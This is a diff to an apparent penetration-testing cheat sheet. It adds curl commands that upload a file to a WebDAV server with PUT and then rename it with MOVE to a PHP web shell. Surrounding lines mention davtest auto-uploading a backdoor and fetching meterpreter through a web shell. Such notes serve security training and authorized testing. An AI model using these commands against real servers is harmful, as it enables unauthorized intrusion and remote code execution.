@@ -1081,9 +1081,17 @@ File Transfers
 
     -   Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
     
-        davtest -move -sendbd auto -url http://$ip
+        `davtest -move -sendbd auto -url http://$ip`
       
         https://github.com/cldrn/davtest
+        
+        You can also upload a file using the PUT method with the curl command:
+        
+        `curl -T 'leetshellz.txt' 'http://$ip'`
+        
+        And rename it to an executable file using the MOVE method with the curl command:
+
+        `curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'`
 
     -   Upload shell using limited php shell cmd  
         use the webshell to download and execute the meterpreter  
